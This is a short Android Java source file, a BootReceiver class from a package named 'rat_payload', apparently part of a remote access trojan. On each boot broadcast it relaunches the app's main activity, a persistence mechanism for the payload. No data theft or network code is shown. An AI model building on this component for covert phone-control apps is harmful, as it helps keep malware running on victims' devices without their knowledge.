package com.app.rat_payload;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * Created by anirudh on 12/18/16.
 */

public class BootReceiver extends BroadcastReceiver {

    /*
    * Start Main Activity.
    *
    */
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent intent1 = new Intent(context, MainActivity.class);
        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent1);
    }


}
